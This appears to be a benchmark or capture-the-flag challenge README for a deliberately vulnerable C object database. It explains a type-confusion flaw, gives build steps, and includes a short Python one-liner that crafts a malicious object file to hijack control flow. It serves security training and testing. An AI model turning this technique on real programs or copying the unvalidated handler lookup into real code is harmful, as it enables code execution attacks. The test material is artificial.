# oxo-linux-ben16 Object Database

## Challenge Details

### Description

This C program implements an object database with polymorphic object types. The database stores objects with a type field and a function pointer for type-specific operations. The load_object function reads object data from a file but fails to validate the type field. An attacker can craft a malicious file with an invalid type value, causing the program to use an incorrect offset when calling the type handler, effectively performing type confusion and potentially executing arbitrary code.

### Vulnerability Type and Category
- **Type:** Type Confusion
- **Category:** Memory Corruption

### Difficulty
Easy

## Build instructions
This is a C program that demonstrates memory corruption vulnerabilities in Linux systems.

Open the benchmark directory.

Use the provided Makefile to compile the program.

```bash
cd oxo-linux-ben16
make
```

Run the compiled application and interact with it to explore the vulnerability.

## Exploitation

**Attack Strategy:**
1. Create malicious object file with invalid type field
2. Trigger type confusion in handler lookup
3. Execute arbitrary function pointer
4. Achieve code execution through confused type handler

**Exploitation Steps:**
```bash
# Create malicious object file
python3 -c "import struct; f=open('evil.obj','wb'); f.write(struct.pack('I', 999) + b'A'*100); f.close()"

./app evil.obj
# Type field (999) is out of bounds
# Array lookup uses invalid index
# Executes memory at incorrect offset as function

# Expected: Control flow hijack via type confusion
```

**Key Points:**
- No type field validation
- Out-of-bounds array access for handler
- Function pointer at confused type offset
- Can redirect execution to arbitrary code
